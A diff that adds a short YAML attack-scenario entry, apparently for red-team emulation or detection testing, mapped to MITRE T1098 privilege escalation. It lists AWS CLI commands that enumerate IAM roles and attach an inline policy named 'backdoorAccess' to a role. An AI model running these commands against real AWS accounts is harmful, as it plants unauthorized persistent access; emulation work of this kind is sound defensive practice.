@@ -1,0 +1,9 @@
+name: IAM Enumeration and Policy Injection
+description: Enumerate IAM roles and inject malicious inline policies.
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+  - action: aws iam list-roles
+    description: Enumerate all IAM roles in the account
+  - action: aws iam put-role-policy --role-name <role-name> --policy-name backdoorAccess --policy-document file://backdoor_policy.json
+    description: Inject inline policy with backdoor permissions
